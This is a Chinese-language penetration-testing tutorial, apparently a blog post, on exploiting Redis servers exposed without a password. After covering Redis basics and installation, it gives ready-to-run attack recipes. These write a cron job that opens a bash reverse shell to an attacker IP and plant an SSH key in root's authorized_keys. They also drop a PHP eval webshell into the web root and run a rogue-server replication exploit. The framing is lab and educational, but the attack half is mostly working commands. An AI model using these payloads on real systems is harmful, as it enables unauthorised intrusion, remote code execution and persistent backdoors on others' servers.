# 渗透测试中Redis 常见的攻击方式

未授权访问≠一定能成功利用

## Redis是什么？

Redis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。

Redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set —有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。

Redis运行在内存中但是可以持久化到磁盘，所以在对不同数据集进行高速读写时需要权衡内存，因为数据量不能大于硬件内存。在内存数据库方面的另一个优点是，相比在磁盘上相同的复杂的数据结构，在内存中操作起来非常简单，这样Redis可以做很多内部复杂性很强的事情。同时，在磁盘格式方面他们是紧凑的以追加的方式产生的，因为他们并不需要进行随机访问。

Redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部分场合可以对关系数据库起到很好的补充作用。

## Redis 基本语法

### Redis 配置

Redis 的配置文件位于 Redis 安装目录下，文件名为 **redis.conf**(Windows 名为redis.windows.conf)。你可以通过 **CONFIG**命令**查看**或**设置**配置项。

**Redis CONFIG 查看配置命令格式如下：**

```
redis 127.0.0.1:6379> CONFIG GET CONFIG_SETTING_NAME
```

使用 *****号获取所有配置项：

```
redis 127.0.0.1:6379> CONFIG GET *

  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "unixsocket"
  8) ""
  9) "logfile"
  ......
```

### Redis 命令

Redis 命令用于在 redis 服务上执行操作。要在 redis 服务上执行命令需要一个 redis 客户端。Redis 客户端在我们之前下载的的 redis 的安装包中。

**Redis 客户端的基本语法为：**

```bash
$ redis-cli
```

以下实例讲解了如何启动 redis 客户端：

启动 redis 客户端，打开终端并输入命令 **redis-cli**。该命令会连接本地的 redis 服务。

```bash
$ redis-cli
redis 127.0.0.1:6379>
redis 127.0.0.1:6379> PING

PONG
```

在以上实例中我们连接到本地的 redis 服务并执行 **PING** 命令，该命令用于检测 redis 服务是否启动，如果服务器运作正常的话，会返回一个 PONG 。

**在远程服务上执行命令**

如果需要在远程 redis 服务上执行命令，同样我们使用的也是 **redis-cli** 命令。

**语法**

```bash
$ redis-cli -h host -p port -a password
```

以下实例演示了如何连接到主机为 127.0.0.1，端口为 6379 ，密码为 mypass 的 redis 服务上。

```bash
$redis-cli -h 127.0.0.1 -p 6379 -a "mypass"
redis 127.0.0.1:6379>
redis 127.0.0.1:6379> PING

PONG
```

### SET 命令

Redis SET 命令用于设置给定 key 的值。如果 key 已经存储其他值， SET 就覆写旧值，且无视类型。

redis SET 命令基本语法如下：

```bash
redis 127.0.0.1:6379> SET KEY_NAME VALUE
```

### Get 命令

Redis Get 命令用于获取指定 key 的值。如果 key 不存在，返回 nil 。

redis Get 命令基本语法如下：

```bash
redis 127.0.0.1:6379> GET KEY_NAME
```

### Flushall 命令

Redis Flushall 命令用于清空整个 Redis 服务器的数据(删除所有数据库的所有 key )。

redis Flushall 命令基本语法如下：

```bash
redis 127.0.0.1:6379> FLUSHALL
```

### Redis 数据备份与恢复

Redis **SAVE** 命令用于创建当前数据库的备份。Save 命令执行一个同步保存操作，将当前 Redis 实例的所有数据快照(snapshot)以默认 RDB 文件的形式保存到硬盘。

redis Save 命令基本语法如下：

```bash
redis 127.0.0.1:6379> SAVE 
OK
```

该命令将在 redis 安装目录中创建dump.rdb文件。

**恢复数据**

如果需要恢复数据，只需将备份文件 (dump.rdb) 移动到 redis 安装目录并启动服务即可。获取 redis 目录可以使用 **CONFIG** 命令，如下所示：

```bash
redis 127.0.0.1:6379> CONFIG GET dir
1) "dir"
2) "/usr/local/redis/bin"
```

以上命令 **CONFIG GET dir** 输出的 redis 安装目录为 /usr/local/redis/bin。

### Redis 安全

我们可以通过 redis 的配置文件设置密码参数，**这样客户端连接到 redis 服务就需要密码验证**，这样可以让你的 redis 服务更安全。

我们可以通过以下命令查看是否设置了密码验证：

```bash
127.0.0.1:6379> CONFIG get requirepass
1) "requirepass"
2) ""
```

**默认情况下 requirepass 参数是空的，也就是说默认情况下是无密码验证的，这就意味着你无需通过密码验证就可以连接到 redis 服务。**

你可以通过以下命令来修改该参数：

```bash
127.0.0.1:6379> CONFIG set requirepass "657260"
OK
127.0.0.1:6379> CONFIG get requirepass
1) "requirepass"
2) "657260"
```

设置密码后，客户端连接 redis 服务就需要密码验证，否则无法执行命令。

**语法**

**AUTH** 命令基本语法格式如下：

```bash
127.0.0.1:6379> AUTH password
```

该命令用于检测给定的密码和配置文件中的密码是否相符。

redis Auth 命令基本语法如下：

```bash
redis 127.0.0.1:6379> AUTH PASSWORD
```

密码匹配时返回 OK ，否则返回一个错误。

实例

```bash
127.0.0.1:6379> AUTH "657260"
OK
127.0.0.1:6379> SET mykey "Test value"
OK
127.0.0.1:6379> GET mykey
"Test value"
```

## Redis 环境搭建

**第一步：**ubuntu中下载安装Redis并解压：

```bash
wget http://download.redis.io/releases/redis-5.0.12.tar.gz
tar -zxvf redis-5.0.12.tar.gz
```

**第二步：**下载并解压好以后，进入到Redis目录中，执行`make`，通过make编译的方式来安装：

```go
make
```

如上图提示 “It’s a good idea to run ‘make test’ “ 则代表编译安装成功。

**第四步：**make结束后，进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）

```bash
cd src
cp redis-cli /usr/bin
cp redis-server /usr/bin
```

**第五步：**返回redis-2.8.17目录，将redis.conf拷贝到/etc目录下。

```bash
cd ../
cp redis.conf /etc
```



**第六步：**使用/etc目录下的reids.conf文件中的配置启动redis服务：

```bash
redis-server /etc/redis.conf
```

## Redis 未授权访问漏洞

Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等。其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。

![pt-1.1](C:\Users\wlen\Desktop\img3\pt-1.1.png)

**简单说，漏洞的产生条件有以下两点：**

> redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。
>
> 没有设置密码认证（一般为空），可以免密码远程登录redis服务。

**漏洞危害：**

> 攻击者无需认证就可以访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；
>
> 攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；
>
> 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。

## 基于未授权访问漏洞的利用

## 0x02 通过计划任务反弹shell

利用条件：

- redis以root身份运行
- 未授权访问或授权口令已知

在kali中通过`redis-cli -h 192.168.100.101 -p 6379`连接到redis，输入以下指令利用crontab反弹shell



```shell
# cron表达式格式：{秒数} {分钟} {小时} {日期} {月份} {星期} {年份(可为空)} 命令
# 每分钟执行一次echo "haha"：* * * * * echo "haha"
192.168.100.101:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.100.99/4444 0>&1\n"

# 设置目录为/var/spool/cron/
192.168.100.101:6379> config set dir /var/spool/cron/

# 设置文件名为root
192.168.100.101:6379> config set dbfilename root

# 保存快照到本地
192.168.100.101:6379> save
```

kali中打开一个新的命令行窗口执行`nc -lvnp 4444`进行监听，过一会儿就能接收到反弹回来的shell：

[![img](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105249042-1990828012.png)](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105249042-1990828012.png)

由于redis的压缩储存机制，在某些情况下会因为反弹shell的指令被压缩，从而导致反弹shell失败：



```shell
192.168.100.101:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.100.100/4444 0>&1\n"
192.168.100.101:6379> save

[root@localhost  ~]# cat /var/spool/cron/root 
* �bash -i &> /dev/tcp/192.168.100@/4  0>&1

192.168.100.101:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.100.99/4444 0>&1\n"
192.168.100.101:6379> save

[root@localhost  ~]# cat /var/spool/cron/root 
* * * * * bash -i &> /dev/tcp/192.168.100.99/4444 0>&1
```

当运行redis的用户为普通用户时，会无法出现切换目录失败的情况：



```shell
config set dir /var/spool/cron
(error) ERR Changing directory: Permission denied
```

## 0x03 通过SSH公钥远程连接

利用条件：

- redis以root身份运行
- 未授权访问或授权口令已知
- 服务器开放SSH服务且允许密钥登录

在kali中使用`ssh-keygen -t rsa`生成密钥：

[![img](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105312101-848184558.png)](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105312101-848184558.png)

将生成的公钥文件保存到本地：



```shell
┌──(root💀kali)-[/home/kali]
└─# (echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > kali
```

将文件写入redis进行利用：



```shell
# 将上一步生成的kali文件写入redis并设置键的值为kali
┌──(root💀kali)-[/home/kali]
└─# cat kali | redis-cli -h 192.168.100.101 -p 6379 -x set kali

# 连接redis，并将公钥文件写入/root/.ssh/authorized_keys中
┌──(root💀kali)-[/home/kali]
└─# redis-cli -h 192.168.100.101 -p 6379
192.168.100.101:6379> config set dir /root/.ssh/
192.168.100.101:6379> config set dbfilename authorized_keys
192.168.100.101:6379> save

# 使用密钥进行登录
┌──(root💀kali)-[/home/kali]
└─# ssh -i /root/.ssh/id_rsa root@192.168.100.101
```

[![img](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105335567-992541671.png)](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105335567-992541671.png)

## 0x04 通过文件写入获取webshell

利用条件：

- 未授权访问或授权口令已知
- 服务器开着WEB服务且WEB目录路径已知

倘若服务器运行着LAMP/LNMP服务，且已知工作目录为`/var/www/html/`，可通过以下指令写入webshell，或参考写入SSH公钥的过程写入木马文件：



```shell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php @eval($_POST['test']);?>"
save
```

## 0x05 通过主从复制获取shell

利用条件：

- 未授权访问或授权口令已知
- Redis <=5.0.5

参考地址：https://github.com/n0b0dyCN/redis-rogue-server

使用方法：



```shell
python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port>
```

参数说明：

- --rpasswd 如果目标Redis服务开启了认证功能，可以通过该选项指定密码
- --rhost 目标redis服务IP
- --rport 目标redis服务端口，默认为6379
- --lhost vps的IP地址
- --lport vps的端口，默认为21000



```shell
┌──(root💀kali)-[/home/kali]
└─# git clone https://github.com/n0b0dyCN/redis-rogue-server.git

┌──(root💀kali)-[/home/kali]
└─# cd redis-rogue-server

┌──(root💀kali)-[/home/kali]
└─# python3 redis-rogue-server.py --rhost 192.168.100.101 --lhost 192.168.100.99
```

[![img](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105353632-844791741.png)](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105353632-844791741.png)
